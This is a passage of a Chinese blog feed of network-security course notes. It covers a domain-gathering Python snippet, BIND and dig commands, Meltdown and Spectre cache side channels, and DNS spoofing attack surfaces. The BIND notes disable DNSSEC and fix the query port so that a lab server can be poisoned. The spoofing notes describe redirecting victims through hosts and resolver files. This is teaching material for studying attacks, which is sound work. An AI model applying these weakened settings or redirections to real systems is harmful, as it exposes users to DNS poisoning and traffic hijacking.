src="/2024/02/20/Lab1_%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/image-20230101161239215.png" class=""><p>访问对应url发现无法正常访问:</p><img src="/2024/02/20/Lab1_%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/image-20230101161257358.png" class=""><p>解决：利用try…except…捕获异常，跳过这部分链接，增强代码的健壮性。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">try</span>:  <span class="hljs-comment"># 跳过无法访问的url</span><br>        new_response = requests.get(url=link, headers=headers)  <span class="hljs-comment"># 访问跳转链接</span><br>        domain_row = new_response.url  <span class="hljs-comment"># 得到真正的url</span><br>        ......<br><span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;name:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(i.a.text), end=<span class="hljs-string">&#x27;  &#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;connection refused:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(link))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>网络攻防课程实验</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/02/20/DNS%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"/>
    <url>/2024/02/20/DNS%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h1>查看本地DNS地址</h1><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo <span class="hljs-keyword">vi</span> /etc/resolv.<span class="hljs-keyword">conf</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># This file is managed by man:systemd-resolved(8). Do not edit.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># This is a dynamic resolv.conf file for connecting local clients to the</span><br><span class="hljs-comment"># internal DNS stub resolver of systemd-resolved. This file lists all</span><br><span class="hljs-comment"># configured search domains.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Run &quot;resolvectl status&quot; to see details about the uplink DNS servers</span><br><span class="hljs-comment"># currently in use.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Third party programs must not access this file directly, but only through the</span><br><span class="hljs-comment"># symlink at /etc/resolv.conf. To manage man:resolv.conf(5) in a different way,</span><br><span class="hljs-comment"># replace this symlink by a static file or a different symlink.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># See man:systemd-resolved.service(8) for details about the supported modes of</span><br><span class="hljs-comment"># operation for /etc/resolv.conf.</span><br><br><span class="hljs-attribute">nameserver</span> <span class="hljs-number">127.0.0.53</span><br><span class="hljs-attribute">options</span> edns0 trust-ad<br><span class="hljs-attribute">search</span> localdomain<br></code></pre></td></tr></table></figure><h1>安装BIND</h1><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-built_in">get</span> install bind9<br></code></pre></td></tr></table></figure><p>文件<code>named.conf</code>：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-comment">// This is the primary configuration file for the BIND DNS server named.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Please read /usr/share/doc/bind9/README.Debian.gz for information on the</span><br><span class="hljs-comment">// structure of BIND configuration files in Debian, *BEFORE* you customize</span><br><span class="hljs-comment">// this configuration file.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// If you are just adding zones, please do that in /etc/bind/named.conf.local</span><br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;/etc/bind/named.conf.options&quot;</span>;<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;/etc/bind/named.conf.local&quot;</span>;<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;/etc/bind/named.conf.default-zones&quot;</span>;<br></code></pre></td></tr></table></figure><p>选项文件<code>named.conf.potions</code>：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs arduino">options &#123;<br>directory <span class="hljs-string">&quot;/var/cache/bind&quot;</span>;<br><br><span class="hljs-comment">// If there is a firewall between you and nameservers you want</span><br><span class="hljs-comment">// to talk to, you may need to fix the firewall to allow multiple</span><br><span class="hljs-comment">// ports to talk.  See http://www.kb.cert.org/vuls/id/800113</span><br><br><span class="hljs-comment">// If your ISP provided one or more IP addresses for stable </span><br><span class="hljs-comment">// nameservers, you probably want to use them as forwarders.  </span><br><span class="hljs-comment">// Uncomment the following block, and insert the addresses replacing </span><br><span class="hljs-comment">// the all-0&#x27;s placeholder.</span><br><br><span class="hljs-comment">// forwarders &#123;</span><br><span class="hljs-comment">// 0.0.0.0;</span><br><span class="hljs-comment">// &#125;;</span><br><br><span class="hljs-comment">//========================================================================</span><br><span class="hljs-comment">// If BIND logs error messages about the root key being expired,</span><br><span class="hljs-comment">// you will need to update your keys.  See https://www.isc.org/bind-keys</span><br><span class="hljs-comment">//========================================================================</span><br>dnssec-validation <span class="hljs-keyword">auto</span>;<br><br>listen-on-v6 &#123; any; &#125;;<br>&#125;;<br></code></pre></td></tr></table></figure><p>添加：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">dump</span>-file <span class="hljs-string">&quot;/var/cache/bind/dump.db&quot;</span>; <span class="hljs-comment"># 缓存转储到指定的文件</span><br>dnssec-enable <span class="hljs-keyword">no</span>;<span class="hljs-comment"># 关闭DNSSEC</span><br>query-source port <span class="hljs-number">33333</span>;<span class="hljs-comment"># 使用固定端口</span><br></code></pre></td></tr></table></figure><p>文件<code>/etc/bind/named.conf</code>用于建立区域</p><h1>转储缓存</h1><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo rndc dumpdb -cache</span><br></code></pre></td></tr></table></figure><h1>清理缓存</h1><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">sudo rndc flush<br></code></pre></td></tr></table></figure><h1>开启/重启DNS服务器</h1><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">sudo service bi<span class="hljs-symbol">nd9</span> restart<br></code></pre></td></tr></table></figure><h1>正向查找</h1><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">dig (<span class="hljs-built_in">domain</span>)<br></code></pre></td></tr></table></figure><h1>反向查找</h1><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">dig</span> -x (<span class="hljs-built_in">IP</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>熔断与幽灵攻击</title>
    <link href="/2024/02/20/12_%E7%86%94%E6%96%AD%E4%B8%8E%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/"/>
    <url>/2024/02/20/12_%E7%86%94%E6%96%AD%E4%B8%8E%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1>1 概述</h1><h2 id="1-1-分支预测">1.1 分支预测</h2><p>流水线和乱序执行是提高CPU运行速度的方法，但是会遇到条件跳转的问题。为了解决这个问题，现代CPU广泛使用分支预测手段。也就是预测条件跳转指令会跳向哪个分支，然后对这个分支进行预取后续指令。分支预测常用的策略是：如果某一段时间内某一条件跳转都走向某一固定分支，则可以预测这条条件跳转指令下一次很大可能也走向这一分支。</p><p>分支预测配合流水线和乱序执行，能够大大提高CPU的运行速度，是现代CPU的主流设计方法。</p><p>分支预测带来的问题–指令执行的回滚。</p><h2 id="1-2-高速缓冲（Cache）">1.2 高速缓冲（Cache）</h2><p>当CPU需要访问内存，例如从内存中取指令时，第一次需要先将相应内存块一次性读入到空闲的Cache块，CPU再直接访问Cache块， 此时内存访问速度会慢一些，因为存在主内存与Cache之间传输成块数据的时间；CPU第二次访问相同块内存时，即可直接访问Cache块， 而无须访问主内存，内存访问速度会快得多。</p><p><strong>指令执行的回滚在主内存–Cache系统留下的痕迹</strong></p><p>如果分支预测失败，则分支预测预取的后续指令需要回滚。撤销指令是容易的，指令完成的工作，无非是对寄存器或者内存的修改，可以 暂且将修改缓存起来，如果撤销，最终不真正修改寄存器或者内存即可。</p><p>而内存则无法撤销，读内存提交前，CPU会将Cache块准备好，就算被回滚，相应内存块也已经读入到了Cache块。</p><p>而内存块是否已经读入到了Cache块，访问速度是有一定差异的，这个痕迹是可以被侧信道利用的。</p><h1>2 侧信道攻击基本概念</h1><ul><li>侧信道密码分析利用密码系统实现时泄露的额外信息，推导密码系统中的秘密参数。特别地，最近几年，计算错误、执行时间、能量消耗、电磁辐射等侧信道得到了深入研究。</li><li>目前，绝大多数计算机均在CPU和内存之间增加CPU缓存（Cache），采用这种体系结构可以显著地提高程序的平均执行性能。然而，如果CPU访问Cache中并不存在的数据时，则将会产生时间延迟，因此此时目标数据必须重新从内存加载到Cache中。测量这种时间延迟有可能让攻击者确定出Cache访问失败的发生和频率。这就是基于缓存的侧信道攻击的基本原理。</li></ul><p><strong>推测执行的两种漏洞</strong></p><p>推测执行包含两种技术，乱序执行（out-of-order execution）和跳转预测（branch prediction），分别对应熔断（Meltdown）漏洞和幽灵（Spectre）漏洞</p><ul><li><p>Meltdown只涉及Intel处理器，Spectre影响Intel、AMD以及ARM处理器。</p></li><li><p>Meltdown和Spectre本质上都是基于缓存侧信道的攻击。</p></li><li><p>Meltdown只能从用户态攻击内核，Spectre攻击可以攻击任何有缺陷的对象，它要求被攻击对象里面有如下Pattern的代码</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-keyword">if</span> <span class="hljs-comment">(index1 &lt; array_a_size)</span> &#123;<br>  i<span class="hljs-symbol">ndex2</span> = array_a[i<span class="hljs-symbol">ndex1</span>];<br>  <span class="hljs-keyword">if</span> <span class="hljs-comment">(index2 &lt; array_b_size)</span><br>     value = array_b[i<span class="hljs-symbol">ndex2</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>理论上，如果index1越界，后面的代码不会被执行。但按预执行理论，即使index1超出了array_a_size的范围，它还是会预执行，一旦这个预执行被执行，就可以通过控制index1的长度，让array_b的特定下标的数据Cacheline被点亮，如果有办法访问一次array_b的全部内容，index1的内容就可以被知道了。</p></li></ul><p><strong>攻击原理</strong></p><p>刷新与重载（Flush and Reload）的攻击中，攻击者首先刷新指令清空高速缓冲存储器的数据，然后等待被攻击者去读取数据，因为数据不在高速缓冲存储器中，所以被攻击者请求的任何数据都必须从主存储器中获取。 然后，攻击者访问共享数据，同时测定这一过程所需的时间。时间少的就是缓存命中的数据。</p><h1>3 CPU缓存</h1><img src="/2024/02/20/12_%E7%86%94%E6%96%AD%E4%B8%8E%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.1.png" class=""><h2 id="3-1-利用CPU缓存记忆秘密">3.1 利用CPU缓存记忆秘密</h2><img src="/2024/02/20/12_%E7%86%94%E6%96%AD%E4%B8%8E%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.2.png" class=""><h1>4 Flush-Reload 技术</h1><img src="/2024/02/20/12_%E7%86%94%E6%96%AD%E4%B8%8E%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.3.jpg" class=""><h1>5 熔断攻击</h1><h2 id="5-1-概述">5.1 概述</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">a. <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span> (<span class="hljs-built_in">rdx</span>) <br>b. <span class="hljs-keyword">add</span> <span class="hljs-built_in">rax</span> <span class="hljs-number">$123</span> <br>c. <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rcx</span> (<span class="hljs-built_in">rbx</span>)<br></code></pre></td></tr></table></figure><p>采用乱序执行的方式，cpu在执行a语句的同时将c语句中的内存位置的信息加载到cache中，这个加载的过程忽略了权限的判断，所以此时cache中有：(rdx)、(rbx)。之后再执行b语句、c语句，在执行c语句时发现并没有权限，所以放弃乱序执行的结果，回滚到最初的状态依次执行。此时cache中的信息没有还原。之后我们通过边信道攻击来测试数据，发现对于某一个数据的访问要远远快于其他数据的访问（因为访问cache中的数据要快于访问内存中的数据），那么就可以知道该数据在cache中，并且可以反推回它的内存地址。</p><h2 id="5-2-对策">5.2 对策</h2><ul><li>根本问题在于CPU硬件：修理费用昂贵</li><li>在操作系统中开发变通方法</li><li>KASLR（内核地址空间布局随机化）<ul><li>不映射用户空间中的任何内核内存，但x86体系结构所需的某些部分除外（例如，中断处理程序）</li><li>用户级程序不能直接使用内核内存地址，因为这样的地址无法解析</li></ul></li></ul><h1>6 幽灵攻击</h1><h2 id="6-1-问题">6.1 问题</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">data=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span>(x&lt;size)&#123;<br>    data=data+<span class="hljs-number">5</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果x&gt;size，是否执行第3行？</p><h2 id="6-2-无序执行">6.2 无序执行</h2><img src="/2024/02/20/12_%E7%86%94%E6%96%AD%E4%B8%8E%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.4.png" class=""><h2 id="6-3-示例">6.3 示例</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">victim</span><span class="hljs-params">(<span class="hljs-type">size_t</span> x)</span>&#123;<br>    <span class="hljs-keyword">if</span>(x&lt;size)&#123;<br>        temp=<span class="hljs-built_in">array</span>[x*<span class="hljs-number">4096</span>+DELTA];<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>从内存中加载大小的值，并将该值与x进行比较。如果大小不在CPU缓存中，那么在读取该值之前可能需要数百个CPU时钟周期。现代cpu不是闲置着，而是试图预测比较的结果，并根据估计推测地执行分支。由于这种执行甚至在比较完成之前就开始了，因此该执行被称为无序执行。在执行无序执行之前，CPU存储其当前状态和寄存器值。当大小的值最终到达时，CPU将检查实际的结果。如果预测是正确的，则进行推测执行，并有显著的性能提高。如果预测错误，CPU将恢复到保存状态，因此无序执行产生的所有结果将被丢弃。从外面我们看到第3行从未被执行，但是为了避免等待，CPU会继续执行第三句，这就是乱序执行，只是结果在检查完成前不会提交。</p><img src="/2024/02/20/12_%E7%86%94%E6%96%AD%E4%B8%8E%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.5.jpg" class=""><h2 id="6-4-攻击目标">6.4 攻击目标</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> buffer_size=<span class="hljs-number">10</span>;<br><span class="hljs-type">uint8_t</span> buffer[<span class="hljs-number">10</span>]=&#123;<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>&#125;;<br><br><span class="hljs-type">uint8_t</span> <span class="hljs-title function_">restrictedAccess</span><span class="hljs-params">(<span class="hljs-type">size_t</span> x)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(x&lt;buffer_size)&#123;<br>        <span class="hljs-keyword">return</span> buffer[x];<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="6-5-幽灵变异与缓解">6.5 幽灵变异与缓解</h2><ul><li><p>自2017年发现以来，已经发现了几个幽灵攻击变体，影响英特尔、ARM和ARM</p></li><li><p>问题在于硬件</p></li><li><p>与熔断不同，没有简单的软件解决方案</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>网络攻防课程实验</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>假消息攻击-DNS欺骗</title>
    <link href="/2024/02/20/11_%E5%81%87%E6%B6%88%E6%81%AF%E6%94%BB%E5%87%BB-DNS%E6%AC%BA%E9%AA%97/"/>
    <url>/2024/02/20/11_%E5%81%87%E6%B6%88%E6%81%AF%E6%94%BB%E5%87%BB-DNS%E6%AC%BA%E9%AA%97/</url>
    
    <content type="html"><![CDATA[<h1>1 DNS层次结构、区域和服务器</h1><h2 id="1-1-DNS域名层次结构">1.1 DNS域名层次结构</h2><img src="/2024/02/20/11_%E5%81%87%E6%B6%88%E6%81%AF%E6%94%BB%E5%87%BB-DNS%E6%AC%BA%E9%AA%97/11.1.png" class=""><p>IANA：<a href="https://www.iana.org/">Internet Assigned Numbers Authority</a>，互联网数字分配机构</p><ul><li>所有顶级域名的官方列表被因特网编号分配机构（IANA）掌管</li><li>每个顶级域名都被IANA委托给一个指定代理，称为注册处。VeriSign是com和net域的指定代理，EDUCASE是edu域的指定代理</li><li>顶级域名的指定代理会通过注册商为公众提供注册服务，用户买了域名后，指定代理会负责把所购域名的相应信息填入注册数据库中</li><li>中国域名注册商有易名中国、万网、商务中国等</li></ul><h2 id="1-2-DNS区域">1.2 DNS区域</h2><img src="/2024/02/20/11_%E5%81%87%E6%B6%88%E6%81%AF%E6%94%BB%E5%87%BB-DNS%E6%AC%BA%E9%AA%97/11.2.png" class=""><ul><li>DNS是根据区域组织的。</li><li>区域将域树上相邻的域和子域分组，并将管理权限分配给实体。每个区域由权威机构管理。一个域名可以由多个机构管理。</li><li>树结构描述example.com域中的子域。</li><li>在这种情况下，每个国家有多个DNS区域。区域保留其每个子域的权限记录。</li><li>区域example.com仅包含不属于任何子域的主机名的DNS记录，<a href="http://xn--mail-f96g.example.com">如mail.example.com</a></li></ul><h2 id="1-3-区域与域">1.3 区域与域</h2><ul><li>DNS区域仅包含域的一部分DNS数据。</li><li>如果域未划分为子域，则区域和域本质上是相同的，因为区域包含域的所有DNS数据。</li><li>当一个域被划分为子域时，它们的DNS数据仍然可以放在同一个区域中，因此域和区域仍然是相同的。</li><li>但是子域可以有自己的区域。usa.example.com是一个域名，其子域为波士顿、纽约和芝加哥。为usa.example.com创建了两个区域。第一个包含SUSA域、芝加哥和波士顿子域，第二个包含NYC子域。</li></ul><h2 id="1-4-权威名称服务器">1.4 权威名称服务器</h2><ul><li>每个DNS区域至少有一个权威名称服务器，用于发布有关该区域的信息，出于冗余目的应至少提供两个权威域名服务器。它提供了DNS查询的原始和最终答案。</li><li>权威名称服务器可以是主服务器（主服务器）或从服务器（辅助服务器）。</li><li>主服务器存储所有区域记录的主副本，而从服务器使用自动更新机制来维护主记录的相同副本。</li></ul><h2 id="1-5-DNS根服务器">1.5 DNS根服务器</h2><ul><li><p>根区域称为root。</p></li><li><p>此区域有13个权威名称服务器（DNS根服务器）。</p></li><li><p>它们提供有关所有TLD的名称服务器信息<code>https://www.internic.net/domain/root.zone</code></p></li><li><p>它们是DNS查询的起点。</p></li><li><p>13个DNS根服务器，它们是互联网上最关键的基础设施。</p><img src="/2024/02/20/11_%E5%81%87%E6%B6%88%E6%81%AF%E6%94%BB%E5%87%BB-DNS%E6%AC%BA%E9%AA%97/11.3.png" class=""></li></ul><h2 id="1-6-顶级域（TLD）">1.6 顶级域（TLD）</h2><ul><li>基础结构TLD:.arpa</li><li>通用TLD（gTLD）：.com、.net</li><li>赞助TLD（sTLD）：这些域名由私人机构或组织提议和赞助，这些机构或组织制定并实施限制TLD使用资格的规则：.edu、.gov、.mil、.travel、.jobs</li><li>国家代码TLD（ccTLD）：.au（澳大利亚），.cn（中国），.fr（法国）</li><li>保留TLD:.example、.test、.localhost、.invalid</li></ul><h2 id="1-7-因特网中区域的组织形式">1.7 因特网中区域的组织形式</h2><p>DNS请求最终目的是从权威域名服务器得到答案，DNS采用分布式方法来找权威域名服务器，以树的形式来组织因特网中所有的 DNS区域，每一个权威域名服务器都可以沿着树的结构找到。</p><p>树的根被称为root区域，IANA负责维护这个区域，有13个权威域名服务器（DNS根服务器）管理这个区域，名称从a到m，即 <a href="http://xn--a-rz6a.root-servers.xn--netm-sm9f.root-servers.net">从a.root-servers.net到m.root-servers.net</a>。</p><h2 id="1-8-本地DNS文件">1.8 本地DNS文件</h2><ul><li><p><code>/etc/host</code>：存储某些主机名的IP地址。在计算机联系本地DNS服务器之前，它首先在该文件中查找IP地址。</p><img src="%E5%81%87%E6%B6%88%E6%81%AF%E6%94%BB%E5%87%BB-DNS%E6%AC%BA%E9%AA%97.assets/1.5.png" alt="1.5" style="zoom: 50%;" /></li><li><p><code>/etc/resolv.conf</code>：向计算机的DNS解析器提供有关本地DNS服务器地址的信息。DHCP提供的本地DNS服务器的IP地址也存储在这里。</p><blockquote><p>:exclamation:note：如果一台计算机用DHCP（动态主机配置协议）得到IP地址，它同时也会从DHCP得到本地DNS服务器的IP地址， 并且存储到resolv.conf文件中，这种情况下，resolv.conf文件会被自动修改，任何对该文件所做的手动 更改都会被覆盖。</p></blockquote></li><li><p>创建区域：通过将两个区域条目添加到<code>/etc/bind/named.conf</code>，在DNS服务器中创建两个区域条目。</p><img src="/2024/02/20/11_%E5%81%87%E6%B6%88%E6%81%AF%E6%94%BB%E5%87%BB-DNS%E6%AC%BA%E9%AA%97/11.9.png" class=""><ul><li>第一个zone用于转发查找（主机名→IP）；第二个用于反向查找（IP-&gt;主机名）。</li></ul></li></ul><h1>2 DNS查询过程</h1><p>用户计算机应用试图与另一台计算机通信时，会先向本机DNS解析器查询，如果失败，再发请求给系统指定的本地DNS服务器， 如果没有，该服务器会逐步从因特网其他DNS服务器查询IP地址。</p><blockquote><p>:exclamation:<strong>本地dns服务器</strong></p><p>计算机通常使用局域网内的DNS服务器，这是&quot;本地&quot;的名字来源，现在许多非本地的DNS服务器可以用作本地 DNS服务器，如谷歌公共DNS等，本地的含义服务器不一定必须位于本地</p></blockquote><img src="/2024/02/20/11_%E5%81%87%E6%B6%88%E6%81%AF%E6%94%BB%E5%87%BB-DNS%E6%AC%BA%E9%AA%97/11.30.png" class=""><ol><li><p>询问root</p><ul><li>DNS响应中有4种类型的节<ul><li>问题部分：向名称服务器描述问题</li><li>回答部分：回答问题的记录</li><li>权威部分：指向权威名称服务器的记录</li><li>附加部分：与查询相关的记录。</li></ul></li><li>dig命令模拟本地DNS服务器的行为</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">dig @<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.root-servers</span><span class="hljs-selector-class">.net</span> www<span class="hljs-selector-class">.example</span>.net<br></code></pre></td></tr></table></figure><img src="/2024/02/20/11_%E5%81%87%E6%B6%88%E6%81%AF%E6%94%BB%E5%87%BB-DNS%E6%AC%BA%E9%AA%97/11.6.png" class=""><p>直接将查询发送到服务器<code>a.root-servers.net</code>，回答部分为空，表明root不知道答案，但是根服务器会告诉我们<code>.net</code>域名服务器。接着会询问AUTHORITY SECTION和ADDITIONAL SECTION部分的服务器。即由于根服务器不知道答案，因此没有答案部分，但在附加部分（记录）中告诉我们有关<u>权威域名服务器（NS记录）</u>及其IP地址的信息。</p></li><li><p>询问一个<code>.net</code>（TLD）域名服务器。<code>.net</code>域名服务器返回了2个<code>example.net</code>区域的权威域名服务器</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">dig @e<span class="hljs-selector-class">.gtld-servers</span><span class="hljs-selector-class">.net</span> www<span class="hljs-selector-class">.example</span>.net<br></code></pre></td></tr></table></figure><img src="/2024/02/20/11_%E5%81%87%E6%B6%88%E6%81%AF%E6%94%BB%E5%87%BB-DNS%E6%AC%BA%E9%AA%97/11.7.png" class=""></li><li><p>继续询问<code>a.lana-server.net</code>（权威域名服务器），得到了答案</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">dig @<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.lana-servers</span><span class="hljs-selector-class">.net</span> www<span class="hljs-selector-class">.example</span>.net<br></code></pre></td></tr></table></figure><img src="/2024/02/20/11_%E5%81%87%E6%B6%88%E6%81%AF%E6%94%BB%E5%87%BB-DNS%E6%AC%BA%E9%AA%97/11.8.png" class=""></li><li><p>当本地DNS服务器从其他DNS服务器获取信息时，它会缓存该信息。</p><p>缓存中的每一条信息都有一个生存时间值，最终将超时并从缓存中删除。</p></li></ol><p><strong>DNS缓存</strong></p><p>当本地DNS服务器从其他DNS服务器得到信息时，它会缓存这个信息，以便将来需要时不必浪费时间再次询问。<br>缓存中的每个信息都有一个存活时间。</p><p><a href="http://xn--mail-f96gs05emjgzm3e.example.net">比如查询mail.example.net</a>，本地DNS服务器不会从root域开始查询，因为缓存中已经有example.net域名服务器的IP 地址，就直接从这个服务器开始查询。</p><h1>3 DNS ATTACK：概述</h1><h2 id="3-1-拒绝服务攻击（DoS）">3.1 拒绝服务攻击（DoS）</h2><p>当本地DNS服务器和权威名称服务器不响应DNS查询时，计算机无法检索IP地址，这从本质上减少了通信。</p><h2 id="3-2-DNS欺骗">3.2 DNS欺骗</h2><ul><li>主要目标：向受害者提供欺诈性IP地址，诱使他们与不同于他们意图的机器进行通信。</li><li>示例：如果用户打算访问银行网站进行网上银行业务，但通过DNS过程获得的IP地址是攻击者的机器，则用户机器将与攻击者的web服务器通信。</li></ul><h2 id="3-3-攻击面概述">3.3 攻击面概述</h2><img src="/2024/02/20/11_%E5%81%87%E6%B6%88%E6%81%AF%E6%94%BB%E5%87%BB-DNS%E6%AC%BA%E9%AA%97/11.10.png" class=""><ul><li><p>（如果攻击者获得了机器的根权限）<strong>在受感染的计算机中攻击</strong></p><ul><li><p>修改 <code>/etc/resolv.conf</code>：使用恶意DNS服务器作为机器的本地DNS服务器，并可以控制整个DNS进程。</p></li><li><p>修改 <code>/etc/hosts</code>：向文件中添加新记录，提供某些选定域的IP地址。例如，攻击者可以修改<code>www.bank32.com</code>的IP地址，这可能导致攻击者的机器。</p></li></ul></li><li><p><strong>攻击用户机</strong></p><p>当用户机给本地DNS服务器发送DNS请求时，攻击者可以立即发送一个欺骗的回复</p></li><li><p><strong>攻击本地DNS服务器：缓存中毒攻击</strong></p><p>当本地DNS服务器向因特网中的DNS服务器发送迭代请求时，攻击者可以发送欺骗回复给本地DNS服务器。<br>欺骗回复的信息通常被DNS服务器缓存，这个攻击被称为DNS缓存中毒攻击。</p></li><li><p><strong>从恶意DNS服务器发起攻击</strong></p><p>比如用户访问attacker32.com这个网站时，一个DNS请求会最终到达attacker32.com的权威域名服务器。 除了在响应的回复部分提供IP地址外，这个域名服务器还会提供授权和附加部分的信息。<br>如果用户不加选择地接受域名服务器提供的所有信息，攻击者就可以通过提供虚假信息来达到攻击的目的。</p></li></ul><h1>4 